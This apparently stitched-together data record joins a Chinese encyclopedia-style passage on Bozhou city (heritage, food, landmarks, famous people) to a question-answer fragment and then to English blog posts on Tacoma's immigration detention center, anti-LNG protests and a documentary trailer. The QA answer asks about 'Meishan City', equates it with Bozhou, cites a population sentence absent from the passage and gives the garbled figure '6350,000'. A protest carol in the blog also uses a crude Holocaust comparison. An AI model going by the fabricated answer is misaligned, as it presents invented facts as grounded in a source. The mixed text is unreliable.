非物质文化遗产2016年，亳州市共有国家级非物质文化遗产名录3项，省级名录20项，市级名录77项。类别名称国家级非物质文化遗产二夹弦五禽戏老子传说省级非物质文化遗产棒鼓舞捻军歌谣亳州剪纸庄子传说蒙城歌谣卢家笙制作技艺陈抟老祖心意六合八法拳高炉家传统酿造技艺淮北梆子戏淮北大鼓清音戏九曲黄河灯阵亳州二夹弦华佗五禽戏泗州戏（拉魂腔）大班会晰扬掌千年古井贡酒酿造工艺资料来源习俗武术：亳州地处中原，武风昌盛。乡民多习武，特别是回民练武成风。亳州历史上武人辈出，晰扬掌、陈抟老祖心意六合八法拳均产生于亳州。剪纸：亳州的旧时大户人家闺女出嫁，每件嫁妆都贴有色彩鲜艳、构图新颖的剪纸，亳州一些人家的室内和许多单位的会议室，都饰以民间特色的剪纸。 高跷：亳州高跷是人踩在木棍上表演，通常是训练有素的团体。大班会：是由亳州班房衙役创造的一种舞剧。“亳州大班会”又称“拉秦桧”、“鬼会”，大班会中的主要人物是通过典型的、性格化的舞蹈动作，刻画出鲜明的人物形象。三斗：亳州社会有很多消遣娱乐活动，如斗鸡、斗蟋蟀、斗鹌鹑、踢毽子、听书、听戏、养鸟、养花、下棋、搓麻将等，最有特��的是前三种，被称为“民间三乐”。肘搁：是亳州民间舞蹈的一种，已有数百年历史。肘搁分“座子”和“架子”两部分。“座子”由体格强壮者担任，回族尚武，故多由回民担任。二夹弦：又名两夹弦，也称\"大五音\"。国家非物质文化剧种之一。主要流行于山东西部以及河南东部及北部，江苏北部，安徽省北部一带的地方戏。亳州二夹弦特色鲜明，清音唱腔优美、婉转悦耳。曲牌除正牌《满江红》等外，还有杂曲10多个。曲目有《西厢记》、《白蛇传》、《红楼梦》、《西游记》等。亳州梆剧：又称“淮北梆子戏”、“安徽梆子”、“土梆子”，是流行于淮北地区的艺术个性化比较强的地方戏曲剧种，也是安徽省具有较大影响的剧种之一，是亳州最受欢迎的一戏剧剧种。华佗五禽戏：是汉族民间广为流传的、也是流传时间最长的健身方法之一，由五种模仿动物的动作组成。五禽戏又称“五禽操”、“五禽气功”、“百步汗戏”等。据说由东汉医学家华佗创制。1982年6月28日，中国卫生部、教育部和国家体委把五禽戏等中国传统健身法作为在医学类大学中推广的“保健体育课”的内容之一。 特色饮食 亳州牛肉馍亳州牛肉馍做法有三道工序：第一道是做馅儿，用上好黄牛肉剁成肉泥，佐以粉丝、葱、姜及多味材料，拌匀后，其形状以能成形不塌架为准；第二道是和面，面和好之后要\"醒\"好，然后用手按成薄皮，层层卷入肉馅，直到皮薄如纸；第三道是炕，先把炭火生旺，再于旺火上盖一层炭灰，厚度以不露明火为准。然后放上平底锅，兑上清香油，把牛肉馍放锅里文火细炕，并不断转动，使其受热均匀。亳州锅盔亳州锅盔又叫壮馍，是一种独特的食品。做法是，取大块面团反复揉\"熟\"，做成脸盆大一个圆饼，厚约寸许，直径一尺到二尺，表层粘上一层芝麻，放在平锅上文火干炕。油炸膜油炸膜又称油杠，为亳州独有。其形似油条，却比油条短而粗，其味道也似油条，但比油条松软可口。蒙城撒汤 蒙城撒汤源于亳州市蒙城县。撒为肉汤、肉杂之意，因其字生僻，人误写为\"撒汤\"、\"杀汤\"等。雁汤是用老母鸡、猪排等为原料，炖好后，打鸡蛋在碗里，搅拌匀后，用肉汤浇沏，制成肉汤蛋花茶。太太鱼太太鱼是亳州的一道特色菜。其名源于亳县县太爷（清末武将）之妻。重油大烧饼蒙城油酥烧饼以小麦面粉为原料，用木炭、煤炭或烤箱烤制。质量要求是底面一样，层多边不硬，出炉后点火即燃。面以盐水和，并按季节调整用盐量，反复揉制，再拽成一二尺长的面带，均匀抹上预先制好的猪油、元茴、花椒、葱等混合佐料，卷好制成饼状。入炉前涂以酱色油和芝麻，入炉烘烤时要掌握火候和炉温。烤熟后饼呈黄色。 特色产品 亳州市近现代工业源于传统手工业。在春秋战国时期，当地已能制造陶等器皿。三国时期的酿酒，唐代的绢织，宋代的绉纱以及明清时期的减酒、酱胡芹、万寿绸、毛毡等亳产手工产品，在全国享有盛誉。清宣统元年（1909年），同茂顺蛋厂建立，成为亳州现代工业的发端。魏武小磨香油亳芍亳桑皮亳紫菀亳州牡丹古井贡酒高炉酒烟草亳桐黄牛豪门贡菊冰茶中涡1号杨树观堂大蒜秦大园萝卜苏赵梨洺流子酒红堂鼓纺织苔干三官核桃亳菊亳花粉古城王魁知麻花---资料来源 风景名胜 综述 2016年，亳州市共有4A级旅游景点（区）6处。境内有各级文物保护单位226余处，其中国家级重点文物保护7处，省级以上重点文物保护单位38家，占全省的三分之一。著名的人文景观有：新石器时代尉迟寺遗址、花戏楼、太清宫、曹操运兵道、华祖庵、曹氏宗族墓群等，在安徽三大旅游版块中，以亳州为重点的文化旅游区是其中之一。类别名称国家级重点文物保护单位花戏楼曹操运兵道曹氏宗族墓群万佛塔尉迟寺遗址南京巷钱庄古井贡酒酿造遗址-----省市级重点文物保护单位华祖庵天静宫道德中宫江宁会馆汤王陵陈抟庙薛阁塔伍奢冢遗址纪家塔张乐行故居捻军会盟旧址店集镇柘王宫遗址新四军第四师司令部旧址东岳庙红城子遗址明王台------资料来源 主要景点 景点图片花戏楼，国家级重点文物保护单位，为国家AAAA级旅游景区，位于亳州市花戏楼路，涡水南岸，原名大关帝庙，又称山陕会馆，是一座建于清康熙年间的专供演戏的建筑。 曹操地下运兵道，国家级重点文物保护单位，现为国家AAAA级景区。位于亳州市人民路老城区地下，以大隅首为中心，向四面延伸，分别通达城外。 曹操宗族墓群，国家级重点文物保护单位，曹操宗族墓群覆盖着亳州近12公里的地方，已开出来的有董园二号墓和章园一号墓。据考证董园二号墓是曹操的祖父曹藤之墓，章园一号墓为曹操父亲曹嵩之墓。 曹腾墓，全国重点文物保护单位，位于市区魏武大道路西的曹氏家族墓群北侧，是曹操祖父曹腾的墓葬。 曹嵩墓，全国重点文物保护单位。位于曹���墓西北处，是魏武帝曹操父亲的墓葬。 尉迟寺，新石器时代聚落遗址，2001年被国务院公布为全国重点文物保护单位，位于蒙城县许疃镇毕集村东，它是父系氏族晚期部落联盟首领所居住的村寨或城堡，被史学界称为\"中国原始第一村\"，被评为1994年全国十大考古新发现。 华祖庵是后人祭祀东汉神医华佗的庙祠，安徽省重点文物保护单位，位于市区曹魏遗迹斗武营和先医庙、神农氏衣冠冢之间。 万佛塔，位于亳州市蒙城县城东南，原名插花塔，俗称蒙城砖塔，是皖北地区著名的佛教建筑，1981年9月被安徽省人民政府公布为全省重点文物保护单位。因塔体内外镶嵌佛像八千余尊，故名万佛塔。此塔在宋代属兴化寺，明代属慈氏寺。故又名兴化寺塔、慈氏寺塔。 文庙，又名孔庙、黉学、学宫、圣宫，俗称圣人殿．1998年5月被安徽省人民政府公布为全省重点文物保护单位，位于亳州市蒙城县新城路中段路北。 庄子祠，位于亳州市蒙城县东郊。据《蒙城县志》记载，北宋元丰元年（1078年）蒙城县令秘书丞王竞为纪念战国时期着名思想家、文学家、蒙城乡贤庄子，在涡河北岸漆园故址首建庄子祠堂。主要建筑有\"逍遥堂\"、\"梦蝶楼\"、\"观鱼台\"等。 天静宫，又名老君殿、太清宫，在亳州市涡阳县涡河北岸的老子出生地郑店村。1985年5月，被安徽省人民政府公布为全省重点文物保护单位。《大明一统志》、《钦定四库全书》、《中都志》等书均记载说天静宫为老子所生之地．在亳州东120里福宁镇。 江宁会馆，1989年被安徽省人民政府公布为全省重点文物保护单位。位于市区古泉路中段，清代南京药材商人集资兴建，具有祭祀神灵、祈福求财，交流信息、商务活动，方便起居、娱乐休闲三大功能。 资料来源 著名人物 姓名备注华佗（约145-208），名敷，字元化，谯（今亳州市谯城区）人，是东汉末年的医学家。曹操（155-220），字孟德，汉、魏时期杰出的政治家、军事家、文学家。曹植（192-232），字子建，沛国谯（今亳州）人，曹操第四子，生前曾封陈王，死后谥日\"思\"。曹腾生卒年不详，字季兴，东汉著名的宦官。张良（？一公元前189），字子房，汉朝初期大臣。许褚生卒年不详，字仲康，亳州人，是曹操著名的猛将和卫士。曹丕（187-226），字子桓，沛国谯（今亳州）人。曹操的第二个儿子。历史上称魏文帝。曹霸（约704—770），曹髦之后，唐代著名画家。曹睿（205-239），字元仲，沛国谯（今亳州）人，曹丕之子。历史上称作魏明帝。曹真（？－231），字子丹。沛国谯（今安徽亳州）人。三国时期曹魏名将，魏武帝曹操族子。夏侯惇（？－220），字元让，沛国谯（今安徽亳州）人。汉末年三国时期曹魏名将。夏侯渊（？－219），字妙才，沛国谯（今安徽亳州）人，东汉末年名将。夏侯玄（209－254），字太初（一作泰初）。沛国谯（今安徽亳州）人。三国时期曹魏玄学家、文学家、官员。夏侯光姬（？－307），小字铜环，沛国谯县（今安徽亳州）人，征西将军夏侯渊的曾孙女，兖州刺史夏侯威的孙女，淮南太守夏侯庄之女，琅琊恭王司马觐的王妃，晋元帝司马睿的生母。花木兰生卒年月不详，魏氏女，谯城县营郭镇人。 [29] 张乐行（1810－863），清末捻军首领，涡阳县张老家村人。李敬玄（615－682），亳州谯县（今安徽谯城）人，唐朝宰相。李绅（772－846），字公垂。祖籍亳州谯县（今安徽省亳州市谯城区）。唐朝宰相、诗人孟汉卿元代杂剧作家。薛蕙（1489－1539），明朝大臣。祖居亳州城内薛家巷。举正德九年进士，授刑部主事。梁巘（yǎn）（1710－1788），字闻山、文山，号松斋，又号断砚斋主人。清朝著名书法家。姜桂题（1843－1922），字翰卿，清代安徽亳州（今亳州市谯城区）人，北洋政府高级将领，陆军上将。马玉昆（？－1908），字荆山，安徽亳州市蒙城马集人。1899年擢浙江提督，次年调还直隶提督。张宗禹清末捻军著名将领、西捻军统帅。卢秉恒1945年2月出生于安徽亳州，中国机械制造与自动化领域著名科学家，中国工程院院士。侯宝璋（1893－1967），利辛县阚疃集人，著名病理学家、医学教育家。邓琳琳前中国女子体操队队员。仲星火著名电影演员，人民艺术家。资料来源 城市荣誉 中国历史文化名城中国优秀旅游城市国家新能源示范城市 [30] 中国长寿之乡2012中国十佳品牌城市 [31] 中国发展成本十强市 [32] 中国十佳绿色城市 [33] 安徽居民幸福排行榜第十名城市中国十大潜力节庆城中国特色魅力城市200强 [34] 中国五禽戏之乡 [35] 全国武术之乡全国上班路上耗时最长城市安徽省首个小麦亩产千斤市皖北旅游中心城市 [7] 安徽省文明创建先进城市安徽思想道德建设先进城市 [36] 安徽双拥模范城市2012网友最喜爱中国十大文化旅游城市全国双拥模范城市 [37] 中国幸福城市20强 [38] 2018年度中国十大最具活力休闲城市 [39] 2019年2月2日，被国家中医药管理局评为市级全国基层中医药工作先进单位。 [40] 第五��安徽省文明城市 [41] 友好城市 国外友好城市国家城市国家城市日本四万十市（1997.05.26）南非维岑堡市（2007.11.07）京丹后市（2006.10.06）巴西维涅多市（2008.12.05）韩国荣州市（2003.10.02）俄罗斯斯摩棱斯克市（友好交流城市）浦项市马来西亚诗巫市（友好交流城市）丹麦斯文堡市（2005.05.24）法国芒特拉热丽市厄瓜多尔克维多市（2007.06.05）干邑市（2015.08.03） [42] 澳大利亚赫本沙尔市美国柔丝密市资料来源国内友好城市省份城市省份城市吉林省通化市 [43] 甘肃省陇南市上海市普陀区定西市安徽省芜湖市山东省菏泽市蚌埠市河北省保定市 [44] 安庆市新疆博尔塔拉蒙古自治州 [45] 河南省许昌市------", "question": " What is the population of Meishan City?", "answer": "\n        According to the information in the doc, the population of Meishan City is 6350,000 in 2015. Specifically, the doc states:\n        \"2015年，亳州市户籍人口635万人，比2014年增加0.6万人;常住人口为504.7万人，城镇化率37%，较2015年提高了1.3个百分点...\"\n        So the population of Meishan City (亳州市) is 6350,000 in 2015."}
{"text": "The Dash Point Pirate\nThe Dash Point Pirate\nPhotography, film, and wooden kayaks, since 2005\nTacoma’s For-Profit Immigration Prison: The Northwest Detention Center\nDindria Barrow, Photo Copyright ©2017 Katya Palladina\nThis video was shot at Solidarity Day organized by the Northwest Detention Center Resistance on Tacoma on January 7, 2017, with the help of Richard Lovering and photographer Katya Palladina.\nI first heard about the Northwest Detention Center during an interview we filmed with Jeannie Darnielle, Washington State Senator for the 27th District. She mentioned the existence of a for-profit prison on the Tacoma Tideflats, an industrial area which includes the Port of Tacoma. Darnielle mentioned that construction of residential buildings on the Tideflats is prohibited, with the exception of the prison. The reason is because Tideflats land is unsuitable for residential construction: it's made of artificial fill, at risk for liquefaction during a major earthquake, and is also in the direct path of lahar (destructive mudflows) that could occur in event that Mt. Rainier erupts.\nHistorically heavily-contaminated by industries that were once located there, the Tideflats is considered a “sacrifice zone”, a geographic zone that has been permanently impaired by environmental damage. Despite decades and millions of dollars spent on remediation, the city approved plans to build the largest methanol plant in the world at a site not far from the NWDC (the plan was defeated by grassroots opposition) and the construction of a liquified natural gas (LNG) production facility. It makes sense that a for-profit detention facility would be located here, following the \"sacrifice zone\" principle that some geographic areas and people need to be sacrificed for the smooth operation of capitalism.\nThe nondescript detention facility is in a low traffic area and out of public view. It could be easily mistaken for a large warehouse except for the high chainlink fence topped with razor wire. The prison is owned and operated by the GEO group, the second largest for-profit prison corporation in the country.\nHorizon, Photo Copyright ©2017 Katya Palladina\nThe 2014 Hunger Strike\nIn March 2014, detainees began a hunger strike to protest conditions that Congressman Adam Smith described as “shocking”. According to Immigration and Customs Enforcement (ICE), the hunger strike involved 750 detainees, but activists report that actually 1,200 detainees were at involved in the hunger strike over a period of 56 days. The detainees were protesting inedible meals, inadequate medical care including delays or refusal to treat life-threatening and painful conditions, poor pay for menial labor (inmates were given the opportunity to do custodial work “voluntarily” for $1/day, although threats and intimidation from guards may have been used to coerce inmates to participate), exorbitant prices charged at the commissary ($8.95 for a bottle of shampoo, for example), and a lack of fundamental fairness and justice. Protesters were subjected to rigged hearings under false accusations. Solitary confinement lasting between 2-30 days and prison transfers were used against detainees as retribution for the protest.\nIn an interview in the Seattle publication The Stranger, detainee Angel Padilla described how he was diagnosed with a cancerous tumor in his left kidney in December 2015. A urologist at St Joseph’s Medical Center recommended urgent surgery for Stage 3 kidney cancer but this was denied for several months. Finally, an immigration court decision allowed him to leave the detention center if he posted bond. After his family raised over $16,000 through crowdfunding, he was able to post bond and have his surgery on May 3, 2016. What makes this inhumane and exploitative treatment of immigrant detainees even more outrageous is that immigration violations are a civil, not a criminal, matter. The reason undocumented immigrants are detained is NOT to punish them for crimes, but to ensure that they are present for deportation proceedings before a federal immigration judge. Many immigrants are arrested following minor infractions, such as traffic offenses. A 2009 ICE internal review found that only 11 percent of detainees had been convicted of violent crimes. Nevertheless, in detention they are treated like dangerous criminals, as evidenced by NWDC’s evacuation plan in the event of a tsunami: “In the event of a mass evacuation, all transportation vehicles should arrive equipped with full set of restraints, handcuffs, belly chains and leg irons to appropriately restrain all residents being transported.” In the event of a tsunami or any other major catastrophe, I highly doubt that 1,500 detainees could be evacuated to safety quickly enough while efforts are being made to restrain everyone.\nStina Janssen and Jessica Ramirez, Photo Copyright ©2017 Katya Palladina\nThe Bed Mandate\nIn 2006 a congressional directive known as the Bed Mandate established a quota for the number of people held in immigration detention centers throughout the country. The policy requires ICE to maintain a population of 34,000 detainees per day. The directive was instituted by conservative lawmakers who thought that ICE was not doing enough to deport undocumented immigrants. It has been criticized for creating an incentive to seek out and incarcerate immigrants for minor nonviolent offenses. Since nearly two-thirds of immigrant detention beds are privatized, the policy was a boon for the private prison industry. As part of its contract with ICE, GEO Group is guaranteed payment for 1000 beds at the NWDC.\nLast year, the Department of Justice decided to phase out the privatization of federal prisons in the criminal justice system, because studies demonstrated that they were more dangerous than those run by the Bureau of Prisons. This decision does not apply however to the civil immigration detention system which is under the Department of Homeland Security.\nIn 2015, Congressman Adam Smith introduced the Accountability in Immigration Detention Act, legistlation which would have created enforceable standards and improve conditions at immigration detention centers while encouraging alternatives to detention and the repeal of the detention bed mandate. Community-based alternatives to incarceration such as home detention would be more humane and less expensive than incarceration. Unfortunately, it looks like incarceration followed by deportation will still be the preferred methods of dealing with undocumented immigrants under President Trump. As more attention and resources are allocated toward detaining and deporting undocumented immigrants, the private immigration detention industry is expected to profit handsomely, at a high cost to taxpayers, detainees, and their families. Posted at 07:57 AM | Permalink\nWhy Are The Citizens of Tacoma Fighting LNG?\nRedline, the grassroots Tacoma organization behind the outrageously successful campaign to stop construction of the largest methanol refinery in the world, has a new campaign against Puget Sound Energy’s proposed Liquified Natural Gas (LNG) production plant which will occupy the space at the entrance to the Hylebos Waterway off of Commencement Bay. The facility will convert natural gas to LNG and store it in a tank nearly as tall as the Tacoma Dome. PSE plans to use the facility to sell LNG as marine fuel, and to store LNG when natural gas prices are low, to be sold to customers when prices are high, a practice known as “peak shaving”. The production plant will be supplied by a 4-mile pipeline which will be built in Tacoma and Fife through land owned by the Puyallup Tribe, which is currently attempting to stop the project by appealing the permits granted for the project’s shoreline development aspects.\nLNG is being sold to the public as a cleaner, cheaper, transitional fuel that will be used to wean us off coal and oil-based fuels. Ships, trucks, and locomotives will be eventually be retrofitted to run off of natural gas. Although it burns with less greenhouse gas emissions, methane itself is a potent greenhouse gas, and leaks during extraction and pipeline transport can be significant. Puget Sound Energy expects that 50 to 60% of the natural gas supplied to their LNG facility will obtained by fracking, and there is mounting evidence that, when the greenhouse gas emissions related to the fracking process, transmission, liquefaction, storage, and conversion back to natural gas are taken into account, greenhouse gas emissions are actually increased. And when one considers the amount of fresh water used in the hydraulic fracking process, the contamination of ground water by fracking, and inevitable pipeline leaks, it is questionable whether there really is any net environmental benefit to using LNG. Nevertheless, natural gas is poised to capture a larger share of the world’s energy demand, and a huge amount of energy and expense is being invested into building a nationwide LNG infrastructure—a network of pipelines and LNG facilities likely to establish LNG as the preferred fuel for ships, trucks, and trains for decades to come.\nBelow are transcripts of the interviews we conducted with activists Valerie Peaphon, Julia Minugh, and Richard Lovering, as well as the text of a speech that activist Roxy Murray gave at the “No Fracked Gas In The Port Of Tacoma” rally organized by Tacoma Direct Action in front of the Puget Sound Energy on December 22, 2016. Parts of these interviews are featured in our video “NO LNG: A Christmas Carol”.\nDemonstration against LNG and the Dakota Access Pipeline, Tacoma, November 12, 2016. Photo Copyright © 2016 Andrew Elizaga\nVALERIE PEAPHON interviewed by Richard Lovering\nValerie: I’m out here tonight on a cold and dark Thursday to protest LNG — the LNG facility that Puget Sound Energy wants to build at the Port of Tacoma. I’m one of many, many Tacomans concerned about the effects this project could have on the environment and on our community. There are a number of dangers associated with liquified natural gas. They typically aren’t built in metropolitan areas, and they want to put this one near neighborhoods, schools, hospitals, childcare facilities, and so we think it is dangerous.\nBut even above and beyond that sort of “Not In My Back Yard” argument, there’s a bigger risk that natural gas poses, and that’s the fact that it’s a false transition. It is going to encourage fracking, which science has already demonstrated is devastating to the earth.\nPuget Sound Energy a couple of months ago was actually bragging on their website that they were going to get 50 or 60% of the natural gas from fracking in Colorado, from the Rockies and Canada. And when we started to push back and say, “Whoa, fracking isn’t good! This is a reason for us to oppose it,” they immediately took that off of their website. I have a screenshot of it that I’ve kept.\nThey’ve just are sort of giving a lot of half truths. They are not sharing information. And when just regular citizens are trying to get information, they have actually filed lawsuits against them. They are claiming federal statutes that don’t apply under FERC [Federal Energy Regulatory Commission] and they don’t currently have all of the permits needed, My understanding is they don’t have the fire permit. They haven’t even applied for it, even though they have already begun to break ground. And so we’re hoping that that is an avenue where we can shut the project down, that the fire department will see that the risks are too great to allow this sort of thing in this sort of metropolitan area.\nRichard: Do you think that it’s going to impact real estate values or people’s interest in moving to Tacoma?\nValerie: Sure, so we’ve done a lot of research and we do believe that if this is built, it’s going to negatively impact real estate prices. Homes in the immediate area are going to go down in value. There is going to be an exodus of a lot of the academia, the artistic community—people that don’t want to live near that. And so we think it is going to have a negative economic impact almost immediately. We already know people who have said, “I am going to move”. And there are already people that have put their house up for sale or have moved as a result of the methanol refinery proposal, which actually didn’t go through but did have real consequences, just the fact that they were threatening to put it in Tacoma. So absolutely we think this is going to have real dire economic consequences in Tacoma.\nRichard: What do you think the politics of this thing are? In other words, what about the Port and what about the City Council? Valerie: I think that there has been an awakening in Tacoma, and it’s been one of disappointment and disillusionment, because we have seen that the Port of Tacoma, the City of Tacoma, the City Council, that our elected leaders aren’t necessarily promoting the ideas and beliefs that their citizens, their residents hold. Instead they seem to be very pro-big business, in this case, pro-fossil fuel, which we know is a dead end. And they’re looking to locking us in to a 50-year lease to something that everybody else is moving away from. People should not be investing in these fossil fuels. They should be looking at renewable, green, clean energy. Tacoma is sort of stuck in the past, or looking toward the past to plan out their future.\nI think there are going to be consequences. There are a number of seats open in the next year, including on the City Council and on the Port, so hopefully we can get some people in there that are progressively minded and environmentally minded who aren’t going to be swayed by some fancy brochures from a million-billion dollar fossil fuel company, because really we shouldn’t be building new infrastructure. We need to find a way to keep oil, coal, and gas in the ground, not build new plants that are going to perpetuate the use of these fossil fuels that damage the environment locally and the planet globally for years and years to come.\nRichard: Where do you suppose those candidates are going to come from?\nValerie: I’m not sure. I don’t have political aspirations, and so I ‘m hoping that it just comes from the grassroots movement and citizens, people who are saying, “I want to be involved. Hey I could do that. I have ideas.” And I think we are starting to hear about some people think about it. I haven’t heard any definitive applicants or volunteers or anything like that yet, but we have a little bit of time, so hopefully some people rise to the occasion.\nJULIA MINUGH interviewed by Richard Lovering\nRichard: How did you get involved in this?\nJulia: Well, I am a member of the Puyallup Tribe. I’ve always been concerned about how the government has treated the Native American people. And I really got involved in Standing Rock. I didn’t go there, but I was doing everything I could at home to support them. Then this came up, and it’s right off of the reservation boundaries. The tribe has gone to court to fight this, but the court and the other people in the city don’t seem to realize what preserving the habitat is, or preserving the culture of the Native Americans. They just brush it off and come up with their own rules about what to do. They pretty much just say, “OK, we’ll consult with you, but we are going to do what we want.”\nThe Tribe has been against it. I’m not speaking for the tribe, this is just for me. But it’s just so disturbing that we are not treated like other people because we are native. We’ve been living in Tacoma, in Fife-—that’s all on the reservation. I mean we’ve been living with all these people and yet we are treated differently. So I think my main idea is that people should listen to the tribes. We’ve been taking care of this land since before the colonizers ever got here. You know that’s what we do—we are fish people. So we just want people to listen and honor our culture.\nA Native American woman burns sage in a purifying ritual at the demonstration against LNG and the Dakota Access Pipeline, Tacoma, November 12, 2016. Photo Copyright © 2016 Andrew Elizaga\nStatement by ROXY MURRAY Most of you know me. For those who don’t my name is Roxy, and I am an environmentalist, a photographer, and one pissed off Tacoma resident! What can I say that hasn’t already been said? Puget Sound Energy is threatening our water, our city, our planet, and our livelihood with the facility that would hold 8 million gallons of fracked liquified natural gas. They are breaking the law by already starting construction on the site. They do not have all their permits and they are currently in court with the Puyallup Tribe. This makes them corporate terrorists, and we don’t negotiate with terrorists!\nWe’ve wasted our precious time away from our families and work and projects to attend city council meetings, port meetings, and court hearings. We’ve spent more time than we care to writing letters to all of the key players. We have done everything right, but the system has failed the citizens of Tacoma and the Puyallup Tribe. And when systems stop working for the people and the planet we must take matters into our own hands. There is a quote by Mahatma Gandhi that I want to share with you: “Civil disobedience becomes a sacred duty when the state becomes lawless or corrupt”. Tacoma will not be a “Sacrifice Zone” for so-called “economic progress”. We’ve heard this statement constantly for a long time, because our brothers and sisters in Standing Rock are fighting, but we must keep saying it: Water is Life! Water is Life! Water is Life!\nRichard Lovering. Demonstration against LNG and the Dakota Access Pipeline, Tacoma, November 12, 2016. Photo Copyright © 2016 Andrew Elizaga\nStatement by RICHARD LOVERING\nAfter methanol (which we managed to drive the folks out of town) in the background there was LNG stealthily making its way across the permitting process. The upshot is that it is almost permitted now. They just lack a fire permit. It’s a disaster! Upstream, there is fracking to get this LNG, and then it gets piped in a gaseous state across many states with the risk of explosions. As a greenhouse gas, of course, methane is very bad. Very bad.,/em> Like 80 times worse than CO2, depending upon whose statistics you quote. And so now all of a sudden Tacoma is faced with an existential threat in the form of an LNG plant—-a huge one. It is essentially going to be a gas station for the ships of the world. And it’s also going to send out its liquified natural gas in trucks and trains to boot. Now clearly at this point we need a supplementary environmental impact statement both because the scope of the project has changed, and also because people need to get involved, which is the very terror of PSE. They do not want to let Tacoma know about this thing or have a voice in objecting to it. At this point the mayor, due to term limits, is about to step down. There’s going to be an election. What I’m trying to do is recruit candidates for City Council positions and the mayor and Port positions. It isn’t enough to just protest. We’ve got to get people in who will make moral decisions about things like LNG.\nAnother such decision was, of course, to have the deportees due to immigration infractions, all aggregated on the Tideflats. We have a for-profit prison for immigrants on the Tideflats. Now the LNG plant will be built right next to it. If there’s an incident, it will knock that prison flat. The guards are allowed to escape; the prisoners are not. They are going to take refuge right there, locked in. It could be a horrendous incident if it happened, or when it happens.\nWe are trying to give LNG a 50 year lease. Now during that time there is probably about a 40% chance that we’ll have an incident, and the incident could be huge and catastrophic. Meanwhile, of course, the LNG plant poses the ideal target for terrorists. It’s a soft target. It’s easy. And as technology gets better with drones and so forth it will be more and more vulnerable from various kinds of places.\nThis is not the Tacoma we want. Whether we are rich or poor, if we have any feeling at all for Tacoma, this is not the direction we want to go, deportation centers for immigrants and LNG plants beside them. This place is going to become another industrial toilet just as it was long ago. So now is the time to change, and we really need elected officials who will make good decisions, make moral decisions. This is basically immoral what PSE is intending to do. It is for the profit and benefit of some guy in Australia, and we are succumbing to it. We shouldn’t.\n\"NO LNG\": A Christmas Carol\nNO LNG: A Christmas Carol from Andrew Elizaga on Vimeo.\nHolidays are the time to reflect on the past and look to the future. The people of Tacoma continue to clean the remnants of an industrial past while wishing for a clean, safe, and sustainable future. This Christmas I want to share a special Christmas carol sung by my good friend Ricardo at the \"No Fracked Gas in the Port of Tacoma\" rally held in on the steps of the Puget Sound Energy offices in Tacoma, December 22, 2016. If you are at all concerned about climate change, the environmental destruction caused by fracking, the risk of fires and explosions from natural gas pipelines, or industrial pollution in Tacoma, I hope you will share this and spread the word about PSE's proposed LNG plant.\nRicardo wrote the \"NO LNG\" Christmas carol just minutes before the rally. I arrived at his house to pick him up and he didn't have a printer attached to his computer so he just emailed it to himself. You can see that he is reading it off his phone while he is singing. Only parts of the song appear in the video but I have included all of the lyrics below.\nNo LNG, no LNG On Christmas eve this is our plea We have a town That your plant pollutes For profits obscene to white guys in suits And so, tonight, with efforts choral We'd like to sing of your efforts immoral\nNo LNG, no LNG It's always Tacoma that pays the fee You've told us that You need to peak shave And have holy intentions Our planet to save But instead rate payers all will be swindled For your Cuban cigars with Ben Franklins kindled\nNo LNG, no LNG The gas you'll frack as general factota Kills the folks in Flint and South Dakota To permit your mess, you've made great haste So we'll live in a toilet of chemical waste\nNo LNG, no LNG And one day soon, there'll be a great blast Which you cannot outrun no matter how fast And the undocumenteds on the flats Will be burned like the Jews and die like rats\nNo LNG, no LNG For Christ's sake leave Despised PSE\nPosted at 07:29 PM in 2016, Film | Permalink\nCOMING SOON: Our new documentary film, \"DANCING WITH HOPE\"\nDancing with Hope Trailer from Andrew Elizaga on Vimeo.\nI am very happy to present the trailer for our new documentary, Dancing with Hope. We expect to be completing this short film and submitting it to film festivals this summer. Dancing with Hope is about Shirts Across America, a Seattle-based nonprofit which sends high school student volunteers to New Orleans to help rebuild homes damaged by Hurricane Katrina. Shirts Across America makes four trips to New Orleans every year, and has been traveling to New Orleans since 2007. We followed them for Spring Break in April 2016.\nKatya and I got involved in making this film purely by chance. My daughter had signed up for the Spring Break Shirts Across America trip and asked me to attend one of their mandatory meetings to pick up the orientation material for her, because she was unable to attend herself. At the meeting, Randy Novak, the founder of Shirts Across America, said that they were still looking for parent volunteers to go on the trip. I called him the next day and asked what volunteering as a parent involved. He said that parents usually act as Adult Team Leaders, which means they are assigned a group of about 5 or 6 students and are responsible for transporting them to the worksites every morning, working with them building houses throughout the day, and taking care of activities in the afternoon and evening, which could mean taking them grocery shopping or out to the French Quarter to buy souvenirs and beignets. The Adult Team Leader basically is always at the side of the students. There are also a few parent volunteers who stand by to help out wherever they are needed, in case, for instance, someone gets sick or injured and needs to be transported away from the worksite.\nThis year Randy said that they were also going to try something different. He needed more promotional material for Shirts Across America, so they planned to organize a Media Team, which would consist of an Adult Team Leader and a few student volunteers. Their job would be to photograph and take video of all the activities that went on throughout the week. I told him that I had some experience in photography and video, and would be very interested in going and organizing the Media Team. Katya also happened to have that week off so I asked her if she would be interested in helping out.\nWe came up with a plan— a curriculum—for the students. It was focused on teaching basic photography and video techniques. The expectations for us were very vague because this was the first time they had planned for a Media Team. I expected to just make a a short “highlights reel” of the week—eye candy, something the students and parents could want to watch to remember the trip by. But I quickly discovered once we had landed in New Orleans that Randy was more interested in making a serious documentary about Shirts Across America. He was constantly arranging interviews for us and giving us lists of events to cover and people to talk to. All of our students were actually more interested in building houses than taking pictures. Fortunately, this relieved us of any teaching duties for the first few days freed Katya and me up to concentrate on shooting.\nFounder of Shirts Across America, Randy Novak, and Maddy Davis, our Media Team assistant, at the St Jude Community Center in the French Quarter, New Orleans. Photo copyright ©2016 Katya Palladina.\nStudents from Olympia High School and Bellarmine Preparatory School assemble at an orientation meeting for SBP (St. Bernard Project). Photo copyright ©2016 Katya Palladina.\nThe Trap of the White Savior Narrative\nDancing with Hope attempts to show the uniqueness of New Orleans as a location and also raise awareness of the continued need for adequate housing. It also addresses racism and white privilege. You cannot ignore racism and the long history of social injustice and economic exploitation of African Americans in the South when making a film about the victims of Hurricane Katrina. While the victims of Hurricane Katrina in New Orleans were overwhelmingly poor people of color, the majority of the volunteers from Shirts Across America are white kids who attend expensive private Catholic schools in the Seattle area, so it is also a challenge trying to avoid the “White Savior” narrative, the trope in which white characters rescue people of color from their plight. Although popular in Hollywood, the White Savior narrative has been criticized for perpetuating racism by framing people of color as incompetent and unable to solve their own problems. In order to avoid falling into the White Savior trope/trap, it was important for us to show that many Shirts Across America volunteers were also people of color. Some of these volunteers have personal connections to New Orleans, either because they once lived there and survived Hurricane Katrina themselves or have family who currently live there who also suffered through the hurricane.\nOn the porch with Stanley Myers. Photo copyright ©2016 Katya 